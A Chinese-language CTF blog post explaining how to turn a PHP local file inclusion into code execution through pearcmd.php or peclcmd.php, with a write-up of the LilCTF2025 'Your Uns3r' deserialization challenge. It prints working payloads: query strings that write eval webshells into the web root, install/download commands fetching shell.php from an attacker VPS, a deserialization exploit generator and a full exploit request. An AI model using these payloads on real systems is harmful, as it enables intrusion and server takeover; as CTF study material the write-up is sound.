---
description: '记录 pearcmd.php 在文件包含场景下的利用思路、参数细节和常见打法。'
title: 关于pearcmd.php的利用
date: 2025-11-23T22:12:23Z
lastmod: 2025-11-25T16:34:46Z
tags: [CTF,web]
categories: [CTF,web]
toc: true
toc_number: true
mathjax: false
katex: false
comments: true
---

# 关于pearcmd.php的利用

复现lilctf时遇到了，突然发现自己缺了这块的知识，所以写了这篇

### PECL

PECL 的全称是 The PHP Extension Community Library ，是一个开放的并通过 PEAR(PHP Extension and Application Repository，PHP 扩展和应用仓库)打包格式来打包安装的 PHP 扩展库仓库，**在docker中默认安装，路径为/user/local/lib/php.**

### register\_argc\_argv

register\_argc\_argv\=On

当该选项开启时（Docker 的 PHP 镜像中默认为 On），PHP 会将 HTTP 请求中的 URL 问号后面的内容注册为全局变量 \$argc（参数个数）和 \$argv（参数数组）。

我们可以测试一下

```php
<pre>
<?php
echo "register_argc_argv: " . ini_get('register_argc_argv') . "\n";

echo "GET\n";
if (!empty($_GET)) {
    print_r($_GET);
} else {
    echo "无 GET 参数\n";
}

echo "Argv\n";
if (isset($_SERVER['argv'])) {
    print_r($_SERVER['argc']);
    print_r($_SERVER['argv']);
} else {
    echo "未找到\n";
}
?>
</pre>
```

{% asset_img 64654e73-159f-4cd3-be91-13eb474a5e3d-20251124225232-u5jbe9o.png 测试 %}

发现一个有趣的好像只有+号能分割参数

### 利用

当我们文件包含`pearcmd.php`​时，`pearcmd.php`​会读取register\_argc\_argv开启时的全局变量`$_SERVER['argv']`，变成其的命令参数，然后执行pear命令

pear参数挺多的

```txt
Commands:
build                  Build an Extension From C Source
bundle                 Unpacks a Pecl Package
channel-add            Add a Channel
channel-alias          Specify an alias to a channel name
channel-delete         Remove a Channel From the List
channel-discover       Initialize a Channel from its server
channel-info           Retrieve Information on a Channel
channel-login          Connects and authenticates to remote channel server
channel-logout         Logs out from the remote channel server
channel-update         Update an Existing Channel
clear-cache            Clear Web Services Cache
config-create          Create a Default configuration file
config-get             Show One Setting
config-help            Show Information About Setting
config-set             Change Setting
config-show            Show All Settings
convert                Convert a package.xml 1.0 to package.xml 2.0 format
cvsdiff                Run a "cvs diff" for all files in a package
cvstag                 Set CVS Release Tag
download               Download Package
download-all           Downloads each available package from the default channel
info                   Display information about a package
install                Install Package
list                   List Installed Packages In The Default Channel
list-all               List All Packages
list-channels          List Available Channels
list-files             List Files In Installed Package
list-upgrades          List Available Upgrades
login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]
logout                 Logs out from the remote server [Deprecated in favor of channel-logout]
makerpm                Builds an RPM spec file from a PEAR package
package                Build Package
package-dependencies   Show package dependencies
package-validate       Validate Package Consistency
pickle                 Build PECL Package
remote-info            Information About Remote Packages
remote-list            List Remote Packages
run-scripts            Run Post-Install Scripts bundled with a package
run-tests              Run Regression Tests
search                 Search remote package database
shell-test             Shell Script Test
sign                   Sign a package distribution file
svntag                 Set SVN Release Tag
uninstall              Un-install Package
update-channels        Update the Channel List
upgrade                Upgrade Package
upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]
```

##### 1.config-create

这个方法有两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中

```bash
pear config-create <root_path> <file_path>
```

```txt
?+config-creater+/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1]);?>+/var/www/html/hello.php
```

或者

```txt
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/test.php 
```

##### 2.利用 install或者download远程下载

###### install

```bash
pear install http://[vps]:[port]/test1.php
```

利用

```bash
?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/shell.php
或者
/?file=/usr/local/lib/php/peclcmd.php&+install+http://vps/shell.php
```

###### download

```bash
pear download [option] [package]
```

利用

```bash
?+download+file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/test1.php&
或者
/?file=/usr/local/lib/php/peclcmd.php&+download+http://vps/1.php
```

#### 当pearcmd关键词被ban，可以用peclcmd.php作为平替

### 例题的话LilCTF2025（Your Uns3r）

```php
<?php
highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
    public function exec()
    {
        if (strpos($this->value, 'S:') === false) {
            $ser = serialize(unserialize($this->value));
            $instance = unserialize($ser);
            if ($ser != $this->value && $instance instanceof Access) {
                include($instance->getToken());
            }
        } else {
            throw new Exception("wanna ?");
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}

class Access
{
    protected $prefix;
    protected $suffix;

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;

    }
}

$ser = $_POST["user"];
if (stripos($ser, 'admin') !== false || stripos($ser, 'Access":') !== false) {
    exit ("no way!!!!");
}

$user = unserialize($ser);
throw new Exception("nonono!!!");
Fatal error: Uncaught exception 'Exception' with message 'nonono!!!' in /var/www/html/index.php:52 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 52
```

很明显我们的目标在

```php
include($instance->getToken());
```

我们先一层一层来，首先看到

```php
$ser = $_POST["user"];
if (stripos($ser, 'admin') !== false || stripos($ser, 'Access":') !== false) {
    exit ("no way!!!!");
}
```

这里`admin`​我们能用S:+16进制来绕过，`Access":`我们可以用php类名大小写不敏感来绕过

然后我们看到了

```php
 public function exec()
    {
        if (strpos($this->value, 'S:') === false) {
            $ser = serialize(unserialize($this->value));
            $instance = unserialize($ser);
            if ($ser != $this->value && $instance instanceof Access) {
                include($instance->getToken());
            }
        } else {
            throw new Exception("wanna ?");
        }
    }
```

前面不能有Access现在又要有，那我们可以利用不完整类来让作为 `__PHP_Incomplete_Class_Name` 的成员变为类名，然后二次反序列化后消除，得到Access

```php
$result = $this->prefix . 'lilctf' . $this->suffix . '.php';
```

路径的话拼接/../t跳跃就行，由于最后面固定了后缀为`.php`，我们可以使用pearcmd，但是

```php
if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");}
```

那我们可以用`peclcmd.php`平替，直接开写

```php
<?php

class Access
{
    protected $prefix = '/usr/local/lib/';
    protected $suffix = '/../php/peclcmd.php';

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;
    }
}

class User
{
    public $username;
    public $value;
    public function exec()
    {
        $ser = unserialize(serialize(unserialize($this->value)));
        if ($ser != $this->value && $ser instanceof Access) {
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}


$a = new User();
$b = new Access();
$a->username = 'admin';
$c = serialize($b);
$c = str_replace('Access":2', '114514":3', $c);
$c = substr($c, 0, -1);
$c .= 's:27:"__PHP_Incomplete_Class_Name";s:6:"Access";}';
$a->value = $c;
$a1 = serialize($a);
$a1 = str_replace(';s:5:"admin"', ';S:5:"\61\64\6d\69\6e"', $a1);
$a1 = substr($a1, 0, -1);//触发__destruct，跳过throw new Exception("nonono!!!");
echo urlencode($a1) . "\n";
```

然后就是发送了，我们构造pear命令

```http
POST /index.php?+config-create+/<?=eval($_POST[cmd])?>+/var/www/html/index.php HTTP/1.1

user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&cmd=system('/readflag');
```

## 总结

闲来无事突然想起来lilctf没有复现，突然发现这题Your Uns3r还挺有意思的，然后了解到了pearcmd.php，花了好些时间来学习，但不知道为什么复现提交完flag后再回来就复现不了了，也发现了自己挺多的小毛病，这里贴上官方wp地址[https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg](https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg)，还得继续好好学习，天天向上。

‍

